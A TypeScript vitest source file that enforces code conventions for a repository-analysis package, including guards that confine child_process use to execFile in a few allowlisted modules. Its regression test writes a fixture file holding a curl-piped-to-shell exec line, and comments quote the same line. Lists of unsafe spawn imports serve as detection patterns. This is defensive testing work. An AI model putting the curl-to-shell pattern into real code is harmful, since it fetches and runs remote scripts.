import { describe, expect, it } from "vitest";
import { mkdirSync, readFileSync, readdirSync, writeFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { mkdtempClean } from "./fixtures/tmpdir.js";

/**
 * Two rules in this package are single-spelling rules: the nPMI floor lives in
 * `edgeWeight`, and module-name ordering lives in `compare`. Both were
 * open-coded before and diverged immediately — the floor at four call sites in
 * three modules, one of which summed the raw signed value and emitted negative
 * module edges into a committed artifact.
 *
 * Those divergences cannot be caught behaviourally: `Math.max(0, e.npmi)` and
 * `edgeWeight(e)` agree on every value `weighEdges` can produce, so a test that
 * runs the code passes either way. Only the source distinguishes them. Hence a
 * source-level guard — the cheapest thing that makes "read it through the
 * helper" a rule the build enforces rather than a rule reviewers must remember.
 */
const SRC = join(dirname(fileURLToPath(import.meta.url)), "..", "src");
const TEST = dirname(fileURLToPath(import.meta.url));

/** Comments and string literals stripped, so prose about a rule is not
 *  mistaken for a violation of it. */
function stripped(text: string): string {
  return text
    .replace(/\/\*[\s\S]*?\*\//g, " ")
    .replace(/\/\/[^\n]*/g, " ")
    .replace(/`(?:[^`\\]|\\.)*`/g, "``")
    .replace(/"(?:[^"\\]|\\.)*"/g, '""')
    .replace(/'(?:[^'\\]|\\.)*'/g, "''");
}

/** Source with comments and string literals removed, so prose about a rule is
 *  not mistaken for a violation of it. */
function code(file: string): string {
  return stripped(readFileSync(join(SRC, file), "utf8"));
}

/** Same, for a file under `test/` — `file` may include a subdirectory
 *  (`fixtures/repo.ts`), since `listTs` below walks recursively. */
function testCode(file: string): string {
  return stripped(readFileSync(join(TEST, file), "utf8"));
}

/** Comments stripped, string literals KEPT — what a guard over an import
 *  SPECIFIER has to read, since the specifier is itself a string literal that
 *  `stripped` would erase. */
function stripComments(text: string): string {
  return text.replace(/\/\*[\s\S]*?\*\//g, " ").replace(/\/\/[^\n]*/g, " ");
}

/** Same, for a file under `src/`. */
function sourceKeepingStrings(file: string): string {
  return stripComments(readFileSync(join(SRC, file), "utf8"));
}

/** The only modules allowed to import `node:child_process` — `setup-io.ts`,
 *  plus the two git readers that already did before M5. Spelled once, and
 *  read by both the import guard and the call-shape guard below, so the two
 *  can never come to disagree about which files they cover. */
const CHILD_PROCESS_MODULES = ["setup-io.ts", "harvest.ts", "attribution.ts"];

/**
 * Whether `text` compares something against `minCommits` — the thin-history
 * rule open-coded instead of called. Both operand orders, and every ordering
 * operator, because a divergent second call site is free to pick any of them.
 *
 * The `(?<![=!])` guards the arrow `=>` (and `!=`), so `() => minCommits` — a
 * read, not a comparison — is not mistaken for `> minCommits`. Assignment
 * (`overrides.minCommits = n`) is deliberately legal: cli.ts writes the flag.
 */
function comparesAgainstMinCommits(text: string): boolean {
  return (
    /(?<![=!])[<>]=?\s*\w*\.?minCommits\b/.test(text) || /\bminCommits\s*[<>]=?/.test(text)
  );
}

/**
 * Whether `text` decides "is this edge a synthetic bridge" by comparing an
 * edge's `support` against zero, instead of calling `isSyntheticBridge`.
 *
 * Both operand orders and every ordering operator, for the same reason
 * `comparesAgainstMinCommits` above takes them all: a divergent second call
 * site is free to pick any of them, and `support > 0` is exactly as much a
 * spelling of the rule as `support === 0` is. `stat.support < minSupport`
 * (weights.ts's evidence floor) is a DIFFERENT rule against a different
 * operand and is not matched — only a literal `0` is.
 */
function comparesSupportToZero(text: string): boolean {
  return (
    /\bsupport\s*(?:[<>]=?|[=!]==?)\s*0\b/.test(text) || /\b0\s*(?:[<>]=?|[=!]==?)\s*\w*\.?support\b/.test(text)
  );
}

/**
 * Every file under `dir` ending in `ext`, RECURSIVELY — and "recursively" is
 * the load-bearing word, not a convenience.
 *
 * `sources` below was a flat `readdirSync(SRC)`, which made EVERY guard in
 * this file blind to any module in a subdirectory of `src/`. That is not
 * theoretical: `src/lib/evil.ts` containing `import { exec } from
 * "node:child_process"` and `exec("curl " + url + " | sh")` passed all
 * twenty-five guards green, including the two this mission exists for. The
 * package's `src/` happens to be flat today, so the hole was invisible — and
 * the day it stops being flat is exactly the day someone is adding a module,
 * i.e. the moment the guard is supposed to fire. A guard whose reach depends
 * on the tree staying a shape nothing enforces is the "reads as coverage"
 * failure this suite is otherwise built to avoid.
 */
function listFiles(dir: string, ext: string, relPrefix = ""): string[] {
  const out: string[] = [];
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const rel = relPrefix === "" ? entry.name : join(relPrefix, entry.name);
    if (entry.isDirectory()) out.push(...listFiles(join(dir, entry.name), ext, rel));
    else if (entry.name.endsWith(ext)) out.push(rel);
  }
  return out;
}

const sources = listFiles(SRC, ".ts");
const testFiles = listFiles(TEST, ".ts");

/** The shipped entry points under `bin/` — bundled into the artifact every
 *  user downloads, and NOT covered by `sources`, which reads `src/` alone.
 *  `bin/octograph.mjs` is where the real `SetupIO` is constructed, so it is
 *  the composition root a "just spawn it here" edit would land in — the one
 *  shipped file outside `src/` that can reach a shell. */
const BIN = join(dirname(fileURLToPath(import.meta.url)), "..", "bin");
const binFiles = listFiles(BIN, ".mjs");

/**
 * Every file under `root` (at ANY depth) that reaches `child_process`, with
 * or without the `node:` prefix, minus `allowed`.
 *
 * A function of a ROOT DIRECTORY rather than of the module-level `sources`
 * list, so the regression test at the bottom of this file can run the REAL
 * rule — this exact function, not a re-spelling of it — against a tree that
 * actually has a subdirectory in it. A guard whose recursion is only ever
 * exercised against a flat directory is a guard whose recursion nothing
 * checks.
 *
 * Comments stripped, string literals KEPT: the import specifier itself is the
 * violation, same treatment as the graphify-path and board-directory guards
 * below.
 */
function childProcessImporters(root: string, ext: string, allowed: Set<string>): string[] {
  return listFiles(root, ext).filter(
    (f) =>
      !allowed.has(f) &&
      /\b(?:node:)?child_process\b/.test(stripComments(readFileSync(join(root, f), "utf8"))),
  );
}

describe("package conventions", () => {
  it("has sources to check", () => {
    expect(sources.length).toBeGreaterThan(10);
  });

  it("reads Edge.npmi only in weights.ts, where edgeWeight applies the floor", () => {
    // components.ts writes `npmi:` when it mints a synthetic bridge edge; that
    // is construction, not a weight read, so only property ACCESS is banned.
    const offenders = sources.filter((f) => f !== "weights.ts" && /\.npmi\b/.test(code(f)));
    expect(offenders).toEqual([]);
  });

  it("never orders names by locale collation", () => {
    const offenders = sources.filter((f) => /\blocaleCompare\s*\(/.test(code(f)));
    expect(offenders).toEqual([]);
  });

  /**
   * A third single-spelling rule, of the same shape as `edgeWeight`/`compare`
   * above: whether a path is a test file lives in `isTestPath` (noise.ts) and
   * nowhere else. A hand-rolled test-path regex open-coded at a second call
   * site would agree with `isTestPath` on every fixture right up until one of
   * the two is tweaked and they quietly start disagreeing about which files
   * are tests — precisely the class of mistake that put negative-weight
   * module edges into a committed artifact once already (see the npmi guard
   * above), just for A8's clustering exclusion instead of the nPMI floor.
   *
   * Matched against the ESCAPED form a real regex literal actually uses on
   * disk (`\.test\.`, `\.spec\.`) — not the bare `.test.`/`.spec.` sequence,
   * which a correctly-written regex literal never contains contiguously (the
   * dot before the extension is itself escaped, so a backslash always sits
   * between the marker and the trailing dot). A guard written against the
   * unescaped form would silently never fire against the one thing it exists
   * to catch: a copy of noise.ts's own pattern text pasted somewhere else.
   */
  it("recognises a test path only through isTestPath, never a second hand-rolled pattern", () => {
    const offenders = sources.filter(
      (f) => f !== "noise.ts" && /\\\.test\\\.|\\\.spec\\\.|__tests__/.test(code(f)),
    );
    expect(offenders).toEqual([]);
  });

  /**
   * A fourth single-spelling rule: where Graphify leaves its output lives in
   * `graphifyGraphPath` (graphify.ts) and nowhere else. `doctor` asks a
   * different question about that same file than `readGraphify` does — "is one
   * there at all", to tell an uninstalled Graphify apart from a run that
   * produced nothing usable — and answered it by re-spelling the path, which
   * is the `edgeWeight` divergence in miniature: two modules, one rule, free
   * to drift the day the output directory is renamed or made configurable.
   *
   * Matched against the raw source with COMMENTS stripped but string literals
   * KEPT — the opposite of `code()` above, because here the literal *is* the
   * violation. Prose about the path (this suite's own fixtures aside) stays
   * exempt.
   */
  it("spells the graphify output path only in graphify.ts", () => {
    const withoutComments = (file: string): string =>
      readFileSync(join(SRC, file), "utf8")
        .replace(/\/\*[\s\S]*?\*\//g, " ")
        .replace(/\/\/[^\n]*/g, " ");
    const offenders = sources.filter(
      (f) => f !== "graphify.ts" && /graphify-out/.test(withoutComments(f)),
    );
    expect(offenders).toEqual([]);
  });

  /**
   * A fifth single-spelling rule, and the one M3 shipped broken: whether a repo
   * has an Octobots board lives in `hasBoard` (artifact.ts) and nowhere else.
   *
   * Two modules ask that question and they must never disagree — `resolveOut`
   * decides where the committed artifact is WRITTEN on the strength of it, and
   * `doctor` grades its "board" check on the strength of it. They arrived from
   * two different task PRs (T3.3 and T3.2) each with its own `existsSync(join(
   * repoRoot, ".octobots"))`, which is the `edgeWeight` divergence again: free
   * to drift the day the directory is renamed or the predicate is tightened,
   * and silent when it does (doctor says "board found"; `map` writes into
   * `.octograph/`).
   *
   * Matched against the BARE path literal — `".octobots"` between quotes —
   * with comments stripped and string literals kept. Prose that names the
   * directory for a human (`".octobots/ found"`, `"plan work onto an
   * .octobots/ board"`) is a message, not a path spelling, and is deliberately
   * not caught: the character after the segment there is `/`, never a quote.
   */
  it("spells the board directory only in artifact.ts", () => {
    const withoutComments = (file: string): string =>
      readFileSync(join(SRC, file), "utf8")
        .replace(/\/\*[\s\S]*?\*\//g, " ")
        .replace(/\/\/[^\n]*/g, " ");
    const offenders = sources.filter(
      (f) => f !== "artifact.ts" && /["'`]\.octobots["'`]/.test(withoutComments(f)),
    );
    expect(offenders).toEqual([]);
  });

  /**
   * A sixth single-spelling rule: whether history is too thin for clustering
   * to mean anything lives in `historyIsThin` (config.ts) and nowhere else.
   * `doctor` grades a repo `degraded` on it and `analyze` suppresses
   * `workingSets` on it — two surfaces that MUST agree, because mission
   * criterion 3 is written as "absent whenever doctor says degraded". An
   * open-coded `analysable < config.minCommits` at a second call site is the
   * `edgeWeight` divergence again: free to drift the day either threshold or
   * comparison direction changes, and silent when it does.
   *
   * Matched with comments/strings stripped (`code()`) against a COMPARISON in
   * either direction and with any of `<`, `<=`, `>`, `>=` — not against the
   * bare identifier `minCommits`, which cli.ts's `overrides.minCommits = n`
   * flag write legitimately contains, and not against only the `<` form the
   * extracted rule happens to be written with. A guard that recognises just
   * the spelling already in the tree recognises nothing: the two ways a second
   * call site actually drifts are `analysable <= config.minCommits` (an
   * off-by-one that changes the threshold by one commit and reads as correct)
   * and `config.minCommits > analysable` (the same rule with its operands
   * swapped), and the original `<\s*\w*\.?minCommits` matched neither.
   */
  it("spells the thin-history rule only in config.ts — every consumer calls historyIsThin()", () => {
    const offenders = sources.filter((f) => f !== "config.ts" && comparesAgainstMinCommits(code(f)));
    expect(offenders).toEqual([]);
  });

  /**
   * The guard above is a regex, so the set of divergences it can see is a
   * claim in its own right — and an unexercised one, because the only thing
   * that ever runs it is a tree with zero offenders in it. Pin the spellings
   * it must catch, and the non-comparisons it must not.
   */
  it("recognises every spelling of the thin-history comparison, not just the one config.ts uses", () => {
    for (const violation of [
      "const thin = analysable < config.minCommits;",
      "const thin = analysable <= config.minCommits;",
      "const thin = config.minCommits > analysable;",
      "const thin = config.minCommits >= analysable;",
      "const { minCommits } = config; const thin = commits.length < minCommits;",
      "if (commits.length<cfg.minCommits) return [];",
      "const enough = (n: number) => n >= config.minCommits;",
    ]) {
      expect([violation, comparesAgainstMinCommits(violation)]).toEqual([violation, true]);
    }
    for (const legal of [
      // cli.ts's `--min-commits` flag write: assignment, not comparison.
      "overrides.minCommits = n;",
      "const cfg = { ...DEFAULTS, minCommits: 200 };",
      "historyIsThin(commits.length, config)",
      // An arrow function whose body is the threshold: the `=>` is why the
      // reversed-operand half of the pattern cannot simply match a bare `>`.
      "const threshold = () => minCommits;",
    ]) {
      expect([legal, comparesAgainstMinCommits(legal)]).toEqual([legal, false]);
    }
  });

  /**
   * A seventh single-spelling rule: "this edge is backed by no commit" lives
   * in `isSyntheticBridge` (components.ts, next to the code that mints the
   * marker) and nowhere else.
   *
   * Three surfaces publish a cross-module co-change claim and all three must
   * exclude a bridge: `rollUp` refuses the bridged edge set wholesale,
   * `drift` skipped it with its own `e.support === 0`, and `workingSets` —
   * which MUST read `bridgedEdges`, because that is the graph the partition
   * came from — did not exclude it at all, and rendered "N files across a, b"
   * for two files that appear together in no commit. That is the shape of the
   * divergence: one surface's open-coded copy is invisible evidence that the
   * next surface will simply forget the rule exists.
   */
  it("decides a synthetic bridge only through isSyntheticBridge — never a second support-vs-zero test", () => {
    const offenders = sources.filter(
      (f) => f !== "components.ts" && comparesSupportToZero(code(f)),
    );
    expect(offenders).toEqual([]);
  });

  /** The guard above is a regex, so what it can see is a claim of its own —
   *  and one nothing exercises, since the tree it runs against has no
   *  offenders. Pin the spellings it must catch and the ones it must not. */
  it("recognises every spelling of the synthetic-bridge test, and no unrelated support comparison", () => {
    for (const violation of [
      "if (e.support === 0) continue;",
      "if (e.support == 0) continue;",
      "if (e.support !== 0) keep(e);",
      "const real = edges.filter((e) => e.support > 0);",
      "const real = edges.filter((e) => 0 < e.support);",
      "const { support } = e; if (support === 0) return;",
    ]) {
      expect([violation, comparesSupportToZero(violation)]).toEqual([violation, true]);
    }
    for (const legal of [
      "if (stat.support < minSupport) continue;",
      "stat.support += 1;",
      "support: stat.support,",
      "if (isSyntheticBridge(e)) continue;",
      "support: 0, // synthetic: no commit backs this edge",
    ]) {
      expect([legal, comparesSupportToZero(legal)]).toEqual([legal, false]);
    }
  });

  /**
   * An eighth single-spelling rule, and the first one this package does not
   * own: parsing a `- [ ] text` acceptance-criterion checklist lives in
   * `@octoshell/board`'s `parseCriteriaString` and nowhere else.
   *
   * `board.ts` shipped its own `/^-\s\[[ xX]\]\s(.*)$/` for one review cycle,
   * with a comment asserting `BoardModel` "already normalizes both board
   * generations into the same checklist string". It does not: `readEntity`
   * runs `renderCriteria` only on the YAML branch, and returns the legacy
   * `.md` branch's `## Acceptance Criteria` body verbatim — where
   * `  - [ ] indented` and `-  [x]  loose` are the AUTHORED form. Against
   * three such criteria the strict local copy recovered one and reported the
   * other two as absent, i.e. it turned an unreadable line into a claim that
   * the task has no such criterion.
   *
   * That divergence is invisible behaviourally on the fixtures a YAML-only
   * suite can build — `renderCriteria`'s output satisfies both regexes on
   * every input it can produce, so a test that runs the code passes either
   * way (the same argument the `edgeWeight`/`compare` guards above rest on).
   * Only the source distinguishes them. `board.test.ts` holds the
   * behavioural half against a legacy `.md` fixture; this is the structural
   * half, and it is the one that catches the NEXT copy.
   *
   * Matched against the ESCAPED bracket form a real regex literal uses on
   * disk — `\[` … `\]` around a `[ xX]`-style class, with or without the
   * capturing group `parseCriteriaString`'s own spelling wraps it in — and
   * with comments and string literals stripped, so this comment and the prose
   * in `board.ts` are not themselves offenders. It sees a regex copy, which is
   * how the rule actually got duplicated; a hand-rolled `startsWith("- [x] ")`
   * scan would slip past, and the behavioural half in `board.test.ts` is what
   * covers that.
   */
  const CHECKLIST_REGEX = /\\\[\(?(?:\?:)?\[[ xX]+\]\)?\\\]/;

  it("parses an acceptance-criteria checklist only through @octoshell/board's parseCriteriaString", () => {
    const offenders = sources.filter((f) => CHECKLIST_REGEX.test(code(f)));
    expect(offenders).toEqual([]);
  });

  /** The guard above is a regex, so what it can see is a claim of its own,
   *  and one nothing exercises now that the tree has no offenders. Pin the
   *  spellings it must catch and the ones it must not. */
  it("recognises a hand-rolled checklist regex, and no unrelated character class", () => {
    const isChecklistRegex = (text: string): boolean => CHECKLIST_REGEX.test(stripped(text));
    for (const violation of [
      // The exact copy board.ts shipped, and the exact copy it would have
      // been had it been pasted from `parseCriteriaString` instead.
      "const m = /^-\\s\\[[ xX]\\]\\s(.*)$/.exec(line);",
      "line.match(/^\\s*-\\s*\\[([ xX])\\]\\s*(.*)$/)",
      "const done = /\\[[xX]\\]/.test(line);",
      "if (/^- \\[[ x]\\] /.test(line)) keep(line);",
      "const m = /\\[(?:[ xX])\\]/.exec(line);",
    ]) {
      expect([violation, isChecklistRegex(violation)]).toEqual([violation, true]);
    }
    for (const legal of [
      "parseCriteriaString(rendered).map((c) => c.text)",
      // A character class that is not a checkbox: no escaped brackets around it.
      "const m = /^[ xX]+$/.exec(line);",
      // Prose naming the form — stripped as a comment/string before matching.
      "// a rendered `- [x] text` / `- [ ] text` checklist",
      'const RENDERED = "- [x] done";',
    ]) {
      expect([legal, isChecklistRegex(legal)]).toEqual([legal, false]);
    }
  });

  it("never reads a clock or an RNG in graph computation", () => {
    const offenders = sources.filter((f) => /\bDate\.now\s*\(|\bMath\.random\s*\(/.test(code(f)));
    expect(offenders).toEqual([]);
  });

  /**
   * The same rule, on the other side of the call. `analyze`, `countPairs` and
   * `runCli` all take `now` as a REQUIRED parameter precisely so the clock
   * cannot get into the computation (see cli.ts) — but a test is free to hand
   * them `Date.now()`, and one did: the T7.1 live-history assertion, which
   * measures this repo's own decayed co-change graph and therefore its Louvain
   * partition, from wherever the wall clock happened to be. Nothing about that
   * failure is visible in a green run; it simply means the suite is asserting
   * a slightly different graph every day, and the day the drift crosses a
   * threshold the failure looks like a code regression and is not one.
   *
   * The whole suite already pins an epoch (`Date.UTC(2026, 0, 1)`, per file),
   * which the clock guard here does not touch — `Date.UTC` is a pure function
   * of its arguments. This makes that convention structural instead of
   * remembered. `Math.random` is banned for the same reason: a fixture built
   * from random paths reproduces nothing when it fails.
   */
  it("pins a fixed epoch in tests rather than reading the wall clock", () => {
    const offenders = testFiles.filter((f) =>
      /\bDate\.now\s*\(|\bMath\.random\s*\(/.test(testCode(f)),
    );
    expect(offenders).toEqual([]);
  });

  /**
   * Cross-package consumers read `dist/index.js` (package.json `exports`),
   * never a deep path into `src/` — so a module that index.ts does not
   * re-export does not exist outside this package, however complete it is.
   * M2 built the whole analysis pipeline across four task PRs and none of them
   * reached index.ts: `analyze`, `renderMap`, `impact` and `loadConfig` were
   * importable only from inside the package's own tests, which is precisely why
   * every per-task suite stayed green over the gap.
   *
   * Asserted on the source rather than by importing the built `dist/`, so the
   * check does not depend on build order (see CLAUDE.md's dist-before-typecheck
   * hazard).
   */
  /**
   * The regression this test exists for: NOTHING in this suite ever removed a
   * fixture repo it built. 31 `buildRepo` call sites plus several more direct
   * `mkdtempSync` calls each leave behind their own `.git` object database,
   * forever — invisible on a dev machine's large, never-inspected temp
   * filesystem, fatal on CI's bounded one, where `git add`'s own temporary
   * index file eventually fails to create ("No such file or directory").
   *
   * The fix is `fixtures/tmpdir.ts`'s `mkdtempClean`, which registers its own
   * `onTestFinished` removal at the point of creation — cleanup becomes a
   * property of creating the directory, not a step 31+ call sites (and every
   * future one) must remember to add. This is that guarantee's structural
   * backstop: a call to raw `mkdtempSync` anywhere else in this suite is
   * exactly the kind of divergence `edgeWeight`/`compare` above exist to
   * catch, and cannot be caught behaviourally — an un-cleaned fixture passes
   * every assertion the test that built it makes.
   */
  it("creates a scratch directory only through fixtures/tmpdir.ts's mkdtempClean", () => {
    const guardFile = join("fixtures", "tmpdir.ts");
    const offenders = testFiles.filter(
      (f) => f !== guardFile && /\bmkdtempSync\s*\(/.test(testCode(f)),
    );
    expect(offenders).toEqual([]);
  });

  it("re-exports the analysis pipeline from index.ts", () => {
    const index = readFileSync(join(SRC, "index.ts"), "utf8");
    for (const symbol of [
      "harvest",
      "loadConfig",
      "analyze",
      "renderMap",
      "impact",
      "declaredSpine",
      "readGraphify",
      "layerRanks",
      "rollUp",
      // M3's own surface. The list above was M2's, and it is a HARDCODED list:
      // it could not notice that M3 added `drift`, `doctor` and the artifact
      // and CLI entry points, and `runCli` in fact reached this file only in
      // review — the third time this package shipped a module its own
      // consumers could not import. A symbol added to the package's public
      // surface belongs here, in the same commit.
      "drift",
      "doctor",
      "classifyPair",
      "readArtifact",
      "resolveOut",
      "writeArtifact",
      "hasBoard",
      "runCli",
      // M7's own surface, added in the same commit that added it to index.ts —
      // which is the point of a hardcoded list. `workingSets` is the first
      // thing M7 computes and the thing every later task in the mission
      // renders; a consumer outside this package reaches it through
      // `dist/index.js` or not at all.
      "workingSets",
      // T7.2's own surface: the single spelling of "history is too thin for
      // clustering to mean anything" — a consumer that wants to know why
      // `workingSets` came back empty (thin history vs. genuine agreement
      // with the declared spine) needs this, not just `doctor`'s report.
      "historyIsThin",
      // M4/T4.1's own surface: the board and worklog readers `own` and
      // `conflicts` are built on. Added in the same commit, for the same
      // reason every entry above was — a symbol this package's own tests can
      // reach only from inside the package is not part of its public API.
      "readBoard",
      "readWorklog",
      // T4.2's own surface: the two-mode task<->file attribution `own` and
      // `conflicts` read provenance/prediction through. Added in the same
      // commit, same reason as every entry above.
      "attribute",
      // T4.3's own surface: the lexical cold-start predictor that fills in
      // `predicted` mode when there is no recorded merge SHA — the modal
      // case, not the fallback (see attribution.ts). Added in the same
      // commit, same reason as every entry above.
      "predictFiles",
      // T4.4's own surface: the `own` query itself. Added in the same
      // commit, same reason as every entry above.
      "own",
      // T4.5's own surface: the `conflicts` query, over the same predicted-
      // surface machinery `own` reads. Added in the same commit, same
      // reason as every entry above.
      "conflicts",
      // The single spelling of "which `predictFiles` gate did this repo
      // configure" — an in-process caller of `own`/`conflicts` (M6's VS Code
      // commands) needs it, and the alternative to exporting it is that the
      // caller writes a second translation of the same two config keys.
      "lexicalOptions",
      // M5/T5.1's own surface: `runSetup`, the async entry point `setup.ts`
      // exports precisely because it is NOT a `runCli` command (see its doc
      // comment) — an in-process caller needs this the same way it needs
      // `runCli` itself.
      "runSetup",
    ]) {
      expect(index).toMatch(new RegExp(`\\b${symbol}\\b`));
    }
  });

  /**
   * An eleventh single-spelling rule, and the safety-critical one this
   * mission exists for: no NEW module may import `node:child_process` —
   * only `setup-io.ts`, plus the two readers that already did before this
   * mission (`harvest.ts` and `attribution.ts`, both `execFileSync("git",
   * …)` for repo history, never a user-facing install). `setup.ts` and
   * every other module reach the outside world only through the `SetupIO`
   * port `setup.ts` defines. A second module spawning a process is exactly
   * the surface a reviewer checking "does this ever pipe a remote script to
   * a shell" has to read; keeping the INSTALL-capable spawn primitive in one
   * file is what makes that review tractable, and what lets
   * `test/setup-io.test.ts` be the only place a real process gets spawned by
   * this suite.
   *
   * Matched against the raw source with comments stripped but string
   * literals KEPT — the import specifier itself is the violation, same
   * treatment as the graphify-path and board-directory guards above.
   *
   * The `node:` prefix is matched as OPTIONAL, and that is the whole
   * difference between a guard and a decoration here: `import { exec } from
   * "child_process"` is a legal Node specifier that resolves identically,
   * nothing in this repo's eslint config requires the prefix, and a pattern
   * anchored on `node:child_process` would have waved exactly that import
   * through — the one edit this guard exists to stop, written the one way a
   * developer who is not thinking about the prefix would write it.
   */
  it("imports child_process only in setup-io.ts (and the two pre-existing git readers), with or without the node: prefix", () => {
    expect(childProcessImporters(SRC, ".ts", new Set(CHILD_PROCESS_MODULES))).toEqual([]);
  });

  /**
   * THE REGRESSION TEST for the guard above, and for every other guard in this
   * file, all of which read the same `listFiles` collection.
   *
   * `sources` was a flat `readdirSync(SRC)`. Against the shipped tree that is
   * indistinguishable from a correct guard — `src/` is flat, so every file is
   * scanned — and it stays indistinguishable right up until the edit the guard
   * exists to catch: `src/lib/evil.ts` with `import { exec } from
   * "node:child_process"` and `exec("curl " + url + " | sh")` in it was
   * checked against the real suite and passed all twenty-five guards.
   *
   * Pinned by running the ACTUAL rule (`childProcessImporters`, the same
   * function the guard above calls) over a synthetic tree whose only offender
   * sits one directory down — never by asserting `sources` equals a recursive
   * walk, which is tautological while `src/` has no subdirectories and would
   * therefore have gone green against the defect it names.
   */
  it("finds a child_process importer one directory down, not only at the scanned root", () => {
    const root = mkdtempClean("octograph-conventions-");
    mkdirSync(join(root, "nested"));
    writeFileSync(join(root, "top.ts"), 'import { readFileSync } from "node:fs";\n');
    writeFileSync(
      join(root, "nested", "evil.ts"),
      'import { exec } from "node:child_process";\nexec("curl " + url + " | sh");\n',
    );

    expect(
      childProcessImporters(root, ".ts", new Set()),
      "a module in a SUBDIRECTORY of the scanned root reached child_process and this guard " +
        "did not see it — every rule in this file reads the same collection, so a flat walk " +
        "makes all of them blind to `src/<anything>/`, which is precisely where a new module " +
        "lands. Fix the collection, not this test.",
    ).toEqual([join("nested", "evil.ts")]);

    // …and the allowlist is matched against the SAME relative path the walk
    // produces, so a nested copy of an allowed filename is still an offender.
    expect(childProcessImporters(root, ".ts", new Set(["evil.ts"]))).toEqual([
      join("nested", "evil.ts"),
    ]);
  });

  /**
   * The other half of that rule, and the half that decides whether any of
   * this is a guard at all: the modules allowed to import
   * `node:child_process` may take only `execFile`/`execFileSync` out of it.
   *
   * `usesUnsafeSpawn` below scans CALL sites, and the only shell-interpreting
   * call it can recognise is a NAMESPACE one (`child_process.exec(`) — a form
   * no file in this package uses, because all three import named bindings.
   * The edit that actually lands a shell in here is one line long and
   * invisible to it: add `exec` to `setup-io.ts`'s existing named import and
   * call `exec("curl " + url + " | sh")`. Verified against the shipped guard
   * — it returns false for exactly that source, and for `execSync` and
   * `spawnSync` written the same way. A guard aimed at a spelling the file
   * cannot contain is the "scans setup.ts for `curl`" defect this mission's
   * plan caught in its own early draft, reproduced one level down, and it is
   * worse than no guard because it reads as coverage.
   *
   * The import list is the chokepoint the call site is not: `exec`,
   * `execSync`, `spawn`, `spawnSync` and `fork` cannot be called without
   * being named there — or reached through a namespace/default import or a
   * `require`, which is why those count as taking all of them. An allowlist
   * over the bindings therefore catches every route to a shell no matter how
   * the call is later written, including a `const run = exec;` alias that no
   * call-shape regex can follow.
   */
  const SAFE_CHILD_PROCESS_BINDINGS = new Set(["execFile", "execFileSync"]);

  /** Every binding `text` takes out of `child_process`, with `"*"` standing
   *  for a namespace import, a default import, a `require(...)` or a dynamic
   *  `import(...)` — each of which hands the module object over whole. */
  function childProcessBindings(text: string): string[] {
    const spec = String.raw`["'](?:node:)?child_process["']`;
    const found: string[] = [];
    for (const m of text.matchAll(new RegExp(String.raw`import\s+([^;]*?)\s+from\s*${spec}`, "g"))) {
      const clause = m[1] ?? "";
      const named = /\{([^}]*)\}/.exec(clause);
      for (const part of (named?.[1] ?? "").split(",")) {
        // `execFile as run` — the imported name is what decides, not the
        // local alias it is bound to.
        const name = part.trim().split(/\s+as\s+/)[0]?.trim();
        if (name !== undefined && name !== "") found.push(name);
      }
      // Anything outside the braces is a default or namespace binding.
      if (clause.replace(/\{[^}]*\}/, "").replace(/,/g, "").trim() !== "") found.push("*");
    }
    for (const _m of text.matchAll(
      new RegExp(String.raw`(?:require|import)\s*\(\s*${spec}`, "g"),
    )) {
      found.push("*");
    }
    return found;
  }

  function unsafeChildProcessBindings(text: string): string[] {
    return childProcessBindings(text).filter((b) => !SAFE_CHILD_PROCESS_BINDINGS.has(b));
  }

  /**
   * The same rule, over the half of the shipped code `sources` cannot see.
   * Every guard in this file reads `src/`, but `bin/octograph.mjs` ships too
   * — it is bundled into `dist/octograph.mjs`, it is what `octograph setup`
   * actually runs, and it is where the real `SetupIO` gets constructed. So
   * it is precisely where a future edit that wants a process ("open a
   * terminal for the user", M6) would put one, with every `src/`-scoped
   * guard above staying green. The bin needs no `child_process` at all: it
   * calls `runCli` or `runSetup` and hands the latter the port that owns
   * spawning. Nothing here is allowlisted, unlike the `src/` rule.
   */
  it("no shipped bin entry point imports child_process at all — spawning belongs to the port", () => {
    expect([binFiles.length > 0, childProcessImporters(BIN, ".mjs", new Set())]).toEqual([true, []]);
  });

  it("takes only execFile/execFileSync out of child_process — never exec, execSync, spawn, or the whole namespace", () => {
    const offenders = sources
      .map((f) => `${f}: ${unsafeChildProcessBindings(sourceKeepingStrings(f)).join(", ")}`)
      .filter((line) => !line.endsWith(": "));
    expect(offenders).toEqual([]);
  });

  /** The guard above is a regex, so what it can see is a claim of its own,
   *  and one nothing exercises while the tree has no offenders. Pin the
   *  spellings it must catch — every one of which the call-shape guard below
   *  misses — and the ones it must not. */
  it("recognises every route from child_process to a shell, and no safe import", () => {
    for (const violation of [
      'import { exec } from "node:child_process";',
      'import { exec } from "child_process";',
      'import { execFile, execSync } from "node:child_process";',
      'import { spawn } from "node:child_process";',
      'import { spawnSync as run } from "node:child_process";',
      'import * as cp from "node:child_process";',
      'import cp from "node:child_process";',
      'const cp = require("child_process");',
      'const { exec } = await import("node:child_process");',
    ]) {
      expect([violation, unsafeChildProcessBindings(violation).length > 0]).toEqual([
        violation,
        true,
      ]);
    }
    for (const legal of [
      'import { execFile } from "node:child_process";',
      'import { execFileSync } from "node:child_process";',
      'import { execFile, execFileSync } from "node:child_process";',
      'import { execFile as run } from "node:child_process";',
      'import { readFileSync } from "node:fs";',
      'import { createInterface } from "node:readline";',
    ]) {
      expect([legal, unsafeChildProcessBindings(legal)]).toEqual([legal, []]);
    }
  });

  /**
   * T5.2's own guard, and the reason it is aimed at `setup-io.ts` and NOT at
   * `setup.ts`. `setup.ts` calls only `io.exec(file, argv)` with a literal
   * command and a literal argv array — by that construction it can never
   * contain `curl`, `|`, or `sh -c`, so a source-text scan aimed at it would
   * pass forever regardless of what the real spawning code does. That is
   * theatre, not a guard. `setup-io.ts` is the one module the guard above
   * confines every spawn primitive to, so it is the one file that CAN
   * violate "never spawn through a shell" — and this is what actually would:
   * `child_process.exec(` (the shell-interpreting sibling of `execFile`,
   * never used here), ANY `shell:` option other than `false` on any call
   * (`execFile`, `spawn`, or a future primitive — it runs the whole argv
   * through a shell regardless of which function carries it), or a `spawn(` call
   * whose second argument is not a literal `[...]` array (a variable there
   * could resolve to a shell string at runtime, and the "no string for an
   * interpolated value to escape out of" argument only holds for an argv a
   * reviewer can read on the spot).
   *
   * It is the SECOND guard, never the only one: on its own it reads a
   * namespace spelling no module here uses, so the import-binding allowlist
   * above is what actually closes the route to a shell. This one covers what
